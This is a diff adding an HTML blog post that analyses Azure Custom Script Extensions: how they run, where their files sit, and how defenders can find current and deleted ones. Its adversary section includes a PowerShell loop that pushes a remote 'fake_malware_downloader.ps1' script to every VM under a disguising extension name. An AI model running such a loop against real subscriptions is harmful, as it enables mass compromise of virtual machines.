@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Analysis: Azure Custom Script Extension (Windows) &middot; </title>
+        <meta name="description" content="Today we’re looking at Azure Custom Script Extensions. These are Azure VM extensions that will run a PowerShell script, or sh script for Linux, on a VM. For most of the blog, Custom Script Extensions will be written as CSEs for short. We’re going to be looking at a few things throughout this, such as:
+ How does it work? How do we find out what script is running? Can we find deleted CSEs?">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="generator" content="Hugo 0.82.0" />
+        <meta name="robots" content="index,follow">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        <link rel="stylesheet" href="https://Cloud-Ham.github.io/dist/site.css">
+        <link rel="stylesheet" href="https://Cloud-Ham.github.io/dist/syntax.css">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+        
+        
+        
+        
+        
+
+    </head>
+    <body>
+        
+
+        <div id="wrapper">
+            <header class="site-header">
+                <div class="container">
+                    <div class="site-title-wrapper">
+                        
+                            <h1 class="site-title">
+                                <a href="https://Cloud-Ham.github.io/">Cloud-Ham Blog</a>
+                            </h1>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+
+                    <ul class="site-nav">
+                        
+
+                    </ul>
+                </div>
+            </header>
+
+            <div id="container">
+
+
+<div class="container">
+    <article class="post-container">
+        <header class="post-header">
+    <h1 class="post-title">Analysis: Azure Custom Script Extension (Windows)</h1>
+    
+</header>
+
+        <div class="post-content clearfix">
+    
+
+    <p>Today we’re looking at Azure Custom Script Extensions. These are Azure VM extensions that will run a PowerShell script, or sh script for Linux, on a VM. For most of the blog, <strong>Custom Script Extensions</strong> will be written as <strong>CSEs</strong> for short. We’re going to be looking at a few things throughout this, such as:</p>
+<ul>
+<li>How does it work?</li>
+<li>How do we find out what script is running?</li>
+<li>Can we find deleted CSEs?</li>
+<li>How can we automate CSEs?</li>
+<li>How could an adversary use this?</li>
+</ul>
+<p><strong>How do CSEs work?</strong></p>
+<p><a href="https://docs.microsoft.com/en-us/azure/virtual-machines/extensions/custom-script-windows">Link to Microsoft Documentation</a></p>
+<p>If you add a Custom Script Extension to an Azure VM from the Azure Portal, it will only let you link back to a file within a storage account. There are no other options natively in the portal. If you want to use either a Web URI or Local file share, you need to create the extension via PowerShell.</p>
+<p>For the first test, let’s start by installing a CSE on an Azure VM at creation time to determine if the script will automatically run. In the Advanced tab of the VM creation, we’re going to Select an extension to install and choose Custom Script Extension. This is a pretty plain Get-ComputerInfo command that outputs to a file, stored in an Azure Storage Container.</p>
+<h6 id="creating-the-vm-extension-in-the-azure-portal">Creating the VM Extension in the Azure Portal</h6>
+<p><img src="https://cloud-ham.github.io/images/CSE/CreateAVM051951.png" alt="Creating the VM Extension in the Azure Portal"></p>
+<h6 id="powershell-test-script">PowerShell test script</h6>
+<pre><code>## Create New Directory ##
+New-Item -ItemType Directory -Force -Path C:\Soup | Out-Null
+Get-ComputerInfo | ConvertTo-Json &gt; C:\Soup\sysinfo$(get-date -f yyyy-MM-dd).txt
+</code></pre><p>In my first attempt at the script, I left the path relative rather than an absolute path. I was curious if there is a quick answer to where files without absolute paths would end up after running. Both the PowerShell Script and output file are in the same directory:</p>
+<pre><code>C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.10\Downloads\0\
+</code></pre><h6 id="file-path-of-script-and-output-file">File Path of Script and Output File</h6>
+<p><img src="https://cloud-ham.github.io/images/CSE/FilePath352526.png" alt="File Path of Script and Output file"></p>
+<p>A couple of notes on this process:<!-- raw HTML omitted --></p>
+<ul>
+<li>The script was run after VM &amp; Extension creation (&lt;5 min after VM created</li>
+<li>The script runs as LocalSystem</li>
+<li>The PowerShell script above has -Force for creating the directory. Worth mentioning that by all means, you should have your PowerShell script as silent as possible, and that -Force doesn’t delete and recreate the directory in this command, but rather considers it already created</li>
+</ul>
+<p><strong>How do we find out what script is running?</strong></p>
+<p>There are some Azure Defender for Resource Manager alerts that detect malicious or suspicious scripts executing from Custom Script Extensions. <a href="https://docs.microsoft.com/en-us/azure/security-center/alerts-reference#alerts-resourcemanager">The list of alerts is available here</a></p>
+<p>The Custom Script Extension Properties in the Azure portal does not specify what script is being executed.</p>
+<h6 id="lack-of-details-in-the-azure-portal">Lack of Details in the Azure Portal</h6>
+<p><img src="https://cloud-ham.github.io/images/CSE/CSEProperties3252363.png" alt="Lack of details in Azure Portal"></p>
+<p>A few options would be (At some point, versioning in the file URI might need removed for these to work):</p>
+<p><em>With access to the machine, check files in:</em></p>
+<pre><code>C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.10\Downloads\0\
+</code></pre><p><em>The following file will reference additional context about the file URI:</em></p>
+<pre><code>C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.10\RuntimeSettings\0.settings
+</code></pre><p><em>The following file will provide the status of command execution</em></p>
+<pre><code>C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.10\Status
+</code></pre><p><em>With access to Resource Graph Explorer in the Azure Portal, we can run the query:</em></p>
+<pre><code>Resources
+| where type =~ 'microsoft.compute/virtualmachines/extensions'
+| where id contains 'VMNAME'
+</code></pre><p><strong>NOTE</strong>: This query returns all extensions for the VMNAME. Because Custom Script Extensions may be named something else (Done via PowerShell), searching by it&rsquo;s name might not be the best way to approach it.</p>
+<p><strong>NOTE</strong>: Information on the fileURI used is contained in the extended properties of the result (Scroll right and select &ldquo;See Details&rdquo;</p>
+<p><em>With access to Azure PowerShell, you can run the following: (You&rsquo;ll need both the VMName and name of the extension)</em></p>
+<pre><code>Get-AzVMCustomScriptExtension -ResourceGroupName $rgname -VMName $vmname -Name CustomScriptExtension
+</code></pre><h6 id="results-from-powershell">Results from PowerShell</h6>
+<p><img src="https://cloud-ham.github.io/images/CSE/CSEPsResults3191.png" alt="PowerShell Results"></p>
+<p>Lastly, once the Custom Script Extension is removed from a VM, the script file and its directory (C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension) are deleted as soon as the Portal gives notification that the deletion process is complete.</p>
+<p><strong>Can we find deleted CSEs?</strong></p>
+<p><em>Somewhat</em>. There&rsquo;s two things you&rsquo;d need to piece together:<!-- raw HTML omitted --></p>
+<ul>
+<li>Azure Activity Logs will have events for &ldquo;Create or Update Virtual Machine Extension&rdquo; and &ldquo;Delete Virtual Machine Extension&rdquo;, but do not list the script they executed</li>
+<li>Some form of process logging on the VM to capture details of the PowerShell execution (Sysmon Process logging, PowerShell logging, etc.)</li>
+</ul>
+<p>By using an approximate time around the creation of the extension, sift through PowerShell logs to determine what occurred.</p>
+<h6 id="reviewing-azure-activity-logs-for-createdelete-events">Reviewing Azure Activity Logs for Create/Delete events</h6>
+<p><img src="https://cloud-ham.github.io/images/CSE/AzureActivity31041.png" alt="Reviewing Azure Activity Logs for Create/Delete events"></p>
+<p><strong>How can we automate CSE?</strong></p>
+<p>There are a couple of different approaches we can take here:</p>
+<ul>
+<li>Install &amp; Uninstall Custom Script Extensions at will, that would run a task once each.
+<ul>
+<li>No repetition in tasks, think of this as “pushing a config”</li>
+</ul>
+</li>
+<li>Install a Custom Script Extension and define a scheduled task</li>
+</ul>
+<p>Regardless, we need the PowerShell script to be <strong>idempotent</strong>, meaning that re-running a script wouldn’t change the results of what’s on the server. For example, in the script above where we create a directory, if we would have used “mkdir”, the first run would have created the directory. If it’s run again, the script crashes because the directory already exists.</p>
+<p>We’re going to use the first section above and say we’re going to push a configuration. The easiest way to do this is by adding the Custom Script Extension to a VM via PowerShell and specifying a script from a URI. Let’s use an IIS Config script available from Gest01’s Github (<a href="https://github.com/gest01/iis-install/blob/master/iis-85-install.ps1">https://github.com/gest01/iis-install/blob/master/iis-85-install.ps1</a>)</p>
+<p>Our PowerShell command to issue this config via Custom Script Extensions:</p>
+<pre><code>Set-AzVMCustomScriptExtension -ResourceGroupName DevTestLab `
+-VMName testlab03 `
+-Location EastUS `
+-FileURI 'https://raw.githubusercontent.com/gest01/iis-install/master/iis-85-install.ps1' `
+-Run 'iis-85-install.ps1' `
+-Name IISConfigExtension 
+</code></pre><p>When you run this, PowerShell will be very quiet until it’s fully complete (Custom Script Extension created, file pulled, and script ran)</p>
+<p>A breakdown of flags used here:</p>
+<ul>
+<li>-ResourceGroupName – Name of the VM’s resource group</li>
+<li>-VMName – Name of the VM</li>
+<li>-FileURI – Public endpoint that the file will be collected from</li>
+<li>-Run – Specifies the filename obtained from the URI to run and leave on the system</li>
+<li>Name – You choose the name for the extension. It will be reflected in the Azure Portal</li>
+</ul>
+<p>Some screenshots of how things will look:</p>
+<h6 id="powershell-named-custom-script-extension">PowerShell-Named Custom Script Extension</h6>
+<p><img src="https://cloud-ham.github.io/images/CSE/CustomConfExt.png" alt="Powershell-Named Custom Script Extension"></p>
+<h6 id="powershell-output-when-finished">PowerShell Output When Finished</h6>
+<p><img src="https://cloud-ham.github.io/images/CSE/PSOutput19214.png" alt="PowerShell Output When Finished"></p>
+<p>On the 2nd option of defining a scheduled task, you wouldn&rsquo;t want to create a scheduled task that references the same PowerShell file you placed on the system via CSE, otherwise you&rsquo;d end up with a new scheduled task for each time it runs. Instead, the automation should be in this structure:</p>
+<ul>
+<li>The CSE downloads an additional PowerShell file from a public endpoint</li>
+<li>The CSE defines a scheduled task with the additional PowerShell script</li>
+<li>Uninstall the CSE from the VM at completion</li>
+</ul>
+<p><strong>How could an adversary use this?</strong></p>
+<p>An adversary looking to run malicious code across VMs at scale need only one thing: <strong>Access to an Azure User account with permissions to manage VM Extensions</strong></p>
+<p>It&rsquo;s hard to say what all roles could have this permission, especially with RBAC often needing custom roles to meet business needs. A couple of main ones that would grant the ability to deploy malicious scripts at scale:</p>
+<ul>
+<li>Contributor</li>
+<li>Log Analytics Contributor</li>
+<li>Virtual Machine Contributor</li>
+<li>Anything else with Microsoft.Compute/virtualMachines/<em>, Microsoft.Compute/virtualMachines/extensions/</em>, etc.</li>
+</ul>
+<p><a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles">Link to Microsoft Documentation on Built-in roles</a></p>
+<p>Given a permission scope, the adversary can write a brief script that will download their own PowerShell code to every Windows VM in your environment without needing VM credentials for any of them.</p>
+<pre><code>$azvmlist = Get-AzVM
+foreach ($azvm in $azvmlist)
+{
+Set-AzVMCustomScriptExtension -ResourceGroupName $azvm.ResourceGroupName `
+-VMName $azvm.Name `
+-Location EastUS `
+-FileURI 'https://raw.githubusercontent.com/Cloud-Ham/test_repository/main/fake_malware_downloader.ps1' `
+-Run 'fake_malware_downloader.ps1' `
+-Name SystemHealthCheck 
+}
+</code></pre><h6 id="malicious-custom-script-extension">Malicious Custom Script Extension</h6>
+<p><img src="https://cloud-ham.github.io/images/CSE/MaliciousCSE314032.png" alt="Malicious Custom Script Extension"></p>
+<p>There is also a good post worth going over, written by Jake Karnes specifically about attacking VMs with Custom Script Extensions and Running individual commands to a VM.</p>
+<p><a href="https://blog.netspi.com/attacking-azure-with-custom-script-extensions/">Jake Karnes - Attacking Azure with Custom Script Extensions</a></p>
+<p><strong>Conclusion</strong></p>
+<p>I think Custom Script Extensions (CSEs) are generally overlooked. When companies migrate to the cloud, there&rsquo;s a tendancy to stick to existing tools that might accomplish a similar task. That&rsquo;s fine, there&rsquo;s benefits to that. At the same time, Custom Script Extensions offer both a great benefit and great concern. There&rsquo;s less need for what might be a complex configuration management task written in a specific language for a simple task when the same functionality is offered directly from the cloud at no additional price.</p>
+<p>With that said, the convenience of it is also the danger. What happens when someone gets access to this that shouldn&rsquo;t? The short answer could potentially be, VM compromises at scale.</p>
+
+</div>
+
+        <footer class="post-footer clearfix"><div class="share">
+    </div>
+</footer>
+    </article>
+</div>
+
+            </div>
+        </div>
+
+        <footer class="footer">
+            <div class="container">
+                <div class="site-title-wrapper">
+                    <h1 class="site-title">
+                        <a href="https://Cloud-Ham.github.io/">Cloud-Ham Blog</a>
+                    </h1>
+                    <a class="button-square button-jump-top js-jump-top" href="#" aria-label="Back to Top">
+                        <i class="fa fa-angle-up" aria-hidden="true"></i>
+                    </a>
+                </div>
+
+                <p class="footer-copyright">
+                    <span>&copy; 2021 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
+                </p>
+                <p class="footer-copyright">
+                    <span><a href="https://github.com/roryg/ghostwriter">Ghostwriter theme</a> By <a href="http://jollygoodthemes.com">JollyGoodThemes</a></span>
+                    <span>/ <a href="https://github.com/jbub/ghostwriter">Ported</a> to Hugo By <a href="https://github.com/jbub">jbub</a></span>
+                </p>
+            </div>
+        </footer>
+
+        <script src="https://Cloud-Ham.github.io/js/jquery-1.11.3.min.js"></script>
+        <script src="https://Cloud-Ham.github.io/js/jquery.fitvids.js"></script>
+        <script src="https://Cloud-Ham.github.io/js/scripts.js"></script>
+    </body>
+</html>
+
